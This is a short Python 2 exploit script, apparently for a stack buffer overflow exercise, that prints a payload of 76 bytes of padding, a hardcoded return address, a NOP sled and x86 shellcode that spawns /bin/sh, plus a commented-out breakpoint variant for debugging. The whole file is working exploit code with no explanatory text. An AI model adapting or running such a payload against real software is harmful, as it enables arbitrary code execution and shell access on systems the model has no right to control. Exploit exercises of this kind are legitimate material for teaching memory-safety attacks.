#!/usr/bin/python
import struct

padding = 'A'*76
addr = struct.pack("I",0xffffcf10)
slide = "\x90"*200
int3 = "\xCC"
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

print padding+addr+slide+shellcode
#print padding+addr+slide+int3
